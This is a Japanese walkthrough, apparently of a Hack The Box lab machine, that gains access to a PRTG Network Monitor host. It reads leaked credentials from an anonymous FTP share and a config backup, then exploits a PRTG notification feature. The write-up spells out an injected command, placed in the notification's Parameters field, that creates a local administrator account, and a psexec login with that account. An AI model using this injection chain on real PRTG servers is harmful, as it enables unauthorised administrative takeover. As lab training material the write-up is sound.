# Recon
- port 21 で anonymous login が許可されている ftp server が動いている
- port 80 で PRTG Network monitor が動いている
- ftp server anonymous login するとCドライブをルートとしてるのでいろんなファイルが見れる
  - user.txt を閲覧可能
- PRTG Network Monitor の configuration ファイルを確認
  - プログラム
    - ```%programfiles%\PRTG Network Monitor```
    - ```%programfiles(x86)%\PRTG Network Monitor```
  - データベース
    - ```%programdata%\Paessler\PRTG Network Monitor```
  - https://kb.paessler.com/en/topic/463-how-and-where-does-prtg-store-its-data
- ```/ProgramData/Paessler/PRTG Network Monitor/PRTG Configuration.old.bak```にユーザとパスワードが載っている
  - user: prtgadmin
  - pass: PrTg@dmin2018
- prtgadmin / PrTg@dmin2018 だと入れないけど prtgadmin / PrTg@dmin2019 だと入れる
  - これらは2018年のバックアップデータに書かれてたもので、最新は2019年で動いていることから予測

# Foothold
- PRTG のバージョンは ```18.1.37.13946``` 
- RCEが可能
  - https://www.codewatch.org/blog/?p=453
  - [Setup] -> [Account settings] -> [Notification] -> [+] -> [Add new notification]
  - [Execute Program] を有効にし、```Parameterrs```に```abc.txt | net user htb abc123! /add ; net localgroup administrators htb /add```を記入しsave
    - ```net user htb abc123! /add```はユーザ htb を作成し、パスワードを abc123! とするコマンド
    - ```net localgroup administrators htb /add```はユーザ htb を administrators グループに所属させるコマンド
  - notification したのち ```psexec.py htb:'abc123!'@10.10.10.152``` でログイン
  - ```more root.txt``` で root.txt ゲット
